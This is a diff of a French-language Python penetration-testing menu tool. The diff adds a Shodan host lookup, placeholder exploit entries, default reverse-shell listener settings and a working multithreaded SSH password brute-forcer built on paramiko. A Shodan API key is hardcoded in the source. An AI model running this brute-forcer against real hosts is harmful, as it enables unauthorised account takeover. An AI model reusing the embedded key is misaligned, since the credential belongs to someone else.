@@ -1,39 +1,135 @@
 import utils
 import shodan
-import os
 import hasard
 import json
 import uuid
+from pwn import *
+import paramiko
+import threading
+import time
+import sys
+import os
+import requests
+
+
 
 class ToolBox():
     def __init__(self):
         self.API_KEY = "gh8Ixz0zc2YxQXARZqay75sR7vxeTz6H"
         self.API_KEY_SHODAN = shodan.Shodan(self.API_KEY)
+        self.host = '192.168.1.10'  # Default listener IP
+        self.port = 4444  # Default listener port
         self.results = []
+        self.host = None
+        self.username = None
+        self.input_file = None
+        self.stop_flag = 0
 
-#Fonction Menu
+####### Fonction Menu #######
     def man(self):
-        print(utils.Couleur.ORANGE + "******************************" + utils.Couleur.FIN + " Welcome Challenger " + utils.Couleur.ORANGE + "******************************" + utils.Couleur.FIN + "\n")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "1 - Scan hôte")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "2 - Tests d'authentification")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "3 - Exploitation de vulnéranilités")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "4 - Reporting")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "'info' - Information concernant l'utilisation de la Toolbox")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "'quit' - pour quitter l'outil\n")
+        while True:
+            print(utils.Couleur.ORANGE + "******************************" + utils.Couleur.FIN + " ToolBox " + utils.Couleur.ORANGE + "******************************" + utils.Couleur.FIN + "\n")
+            print(utils.Couleur.MAGENTA + "[1] " + utils.Couleur.FIN + "Scan hôte")
+            print(utils.Couleur.MAGENTA + "[2] " + utils.Couleur.FIN + "Exploitation de vulnérabilités")
+            print(utils.Couleur.MAGENTA + "[3] " + utils.Couleur.FIN + "Reporting")
+            print(utils.Couleur.MAGENTA + "[4] " + utils.Couleur.FIN + "Test d'authentification")
+            print(utils.Couleur.MAGENTA + "[info] " + utils.Couleur.FIN + "Information concernant l'utilisation de la Toolbox")
+            print(utils.Couleur.MAGENTA + "[quit] " + utils.Couleur.FIN + "Pour quitter l'outil\n")
 
-    def manExploit(self):
-        print(utils.Couleur.ORANGE + "******************************" + utils.Couleur.FIN + " Welcome Challenger " + utils.Couleur.ORANGE + "******************************" + utils.Couleur.FIN + "\n")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "1 - Scan hôte")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "2 - Tests d'authentification")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "3 - Exploitation de vulnéranilités")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "4 - Reporting")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "'info' - Information concernant l'utilisation de la Toolbox")
-        print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "'quit' - pour quitter l'outil\n")
+            choice = input(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "Veuillez entrer une commande: ")
+
+            if choice == '1':
+                entryIP = input(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "Veuillez entrer l'adresse IP cible: ")
+                self.scan_host(entryIP)
+            elif choice == '2':
+                self.exploitation_menu()
+            elif choice == '3':
+                self.reporting()
+            elif choice.lower() == 'quit':
+                break
+            elif choice == '4':
+                self.authentification_menu()
+            else:
+                print(utils.Couleur.ROUGE + "[!] " + utils.Couleur.FIN + "Option invalide, veuillez réessayer.")
+    def exploitation_menu(self):
+        while True:
+            print("\n" + utils.Couleur.ORANGE + "******* Exploitation de Vulnérabilités *******" + utils.Couleur.FIN)
+            print(utils.Couleur.MAGENTA + "[1] " + utils.Couleur.FIN + "Exploit_x")
+            print(utils.Couleur.MAGENTA + "[2] " + utils.Couleur.FIN + "Exploit_Y")
+            print(utils.Couleur.MAGENTA + "[3] " + utils.Couleur.FIN + "Exploit Z")
+            print(utils.Couleur.MAGENTA + "[0] " + utils.Couleur.FIN + "Retour au menu principal")
+
+            choice = input(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "Veuillez entrer une option: ")
+
+            if choice == '1':
+                self.run_exploit_x()
+            elif choice == '2':
+                self.run_exploit_y()
+            elif choice == '3':
+                self.run_exploit_z()
+            elif choice == '0':
+                break
+            else:
+                print(utils.Couleur.ROUGE + "[!] " + utils.Couleur.FIN + "Option invalide, veuillez réessayer.")
+
+    def authentification_menu(self):
+        while True:
+            print(
+                "\n" + utils.Couleur.ORANGE + "******* Test d'authification *******" + utils.Couleur.FIN)
+            print(utils.Couleur.MAGENTA + "[1] " + utils.Couleur.FIN + "Brute force SSH")
+            print(utils.Couleur.MAGENTA + "[2] " + utils.Couleur.FIN + "Auth_Y")
+            print(utils.Couleur.MAGENTA + "[3] " + utils.Couleur.FIN + "Auth_Z")
+            print(utils.Couleur.MAGENTA + "[0] " + utils.Couleur.FIN + "Retour au menu principal")
+
+            choice = input(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "Veuillez entrer une option: ")
+            if choice == '1':
+                self.start_bruteforce()
+            elif choice == '2':
+                self.run_auth_y()
+            elif choice == '3':
+                self.run_auth_z()
+            elif choice == '0':
+                break
+            else:
+                print(utils.Couleur.ROUGE + "[!] " + utils.Couleur.FIN + "Option invalide, veuillez réessayer.")
 
 
-    def scanPort(self, IP_CIBLE):
+
+    def ssh_connect(self, password):
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            # Effectue une recherche Shodan pour l'adresse IP donnée
+            ssh.connect(self.host, port=22, username=self.username, password=password)
+            self.stop_flag = 1
+            print(utils.Couleur.VERT + "[*] Mot de passe trouvé: " + password + " pour le compte: "+ self.username + utils.Couleur.FIN)
+        except:
+            print(utils.Couleur.ROUGE +"[-] Login incorrecte: " + password + utils.Couleur.FIN)
+        finally:
+            ssh.close()
+
+    def start_bruteforce(self):
+        self.host = input('[+] Target Address: ')
+        self.username = input('[+] SSH Username: ')
+        self.input_file = input('[+] Passwords File: ')
+        print('\n')
+
+        if not os.path.exists(self.input_file):
+            print('[!!] That File/Path Does Not Exist')
+            sys.exit(1)
+
+        print('Brute force sur ' + self.host + ' avec comme user: ' + self.username + ' * * *')
+
+        with open(self.input_file, 'r') as file:
+            for line in file.readlines():
+                if self.stop_flag == 1:
+                    break
+                password = line.strip()
+                t = threading.Thread(target=self.ssh_connect, args=(password,))
+                t.start()
+                time.sleep(0.5)  # Adjust sleep time as necessary
+
+    def scan_host(self, IP_CIBLE):
+        try:
             results = self.API_KEY_SHODAN.host(IP_CIBLE)
             print(f"Adresse IP : {results['ip_str']}")
             print(f"Organisation : {results.get('org', 'N/A')}")
@@ -171,24 +267,6 @@ class ToolBox():
     def main(self):
         hasard.hasardFunction.randomDesign(self)
         toolbox.man()
-        bol = True
-
-        while bol:
-            userEntry = input(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "Veuillez entrer une commande\n")
-
-            if userEntry == "quit":
-                break
-
-            elif userEntry == "5":
-                self.reporting()
-
-            elif userEntry == "1":
-                entryHost = input(
-                utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "Veuillez entrer l'adresse ip de destination\n")
-                print(utils.Couleur.MAGENTA + "[*] " + utils.Couleur.FIN + "Recherche d'information sur... %s" % entryHost, "\n")
-                toolbox.scanPort(entryHost)
-
-
 
 if __name__ == "__main__":
     toolbox = ToolBox()
